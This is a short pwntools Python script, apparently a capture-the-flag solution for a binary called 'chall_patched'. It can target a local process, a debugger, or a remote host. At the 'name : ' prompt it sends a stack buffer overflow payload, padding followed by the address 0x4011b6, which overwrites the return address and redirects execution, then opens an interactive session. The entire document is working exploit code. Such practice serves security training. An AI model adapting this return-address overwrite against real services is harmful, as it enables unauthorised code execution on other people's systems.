#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.log_level = 'info'
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
host = '192.168.11.63'
port = 11360

gdbscript = '''
'''


def conn():
    match args.TYPE:
        case 'REMOTE':
            r = remote(host, port)
        case 'DBG':
            r = gdb.debug([exe.path], gdbscript)
        case _:
            r = process([exe.path])

    return r


def main():
    r = conn()

    r.recvuntil(b'name : ')
    r.sendline(b'a' * 0x50 + b'a' * 0x8 + pack(0x4011b6))

    r.interactive()


if __name__ == "__main__":
    main()
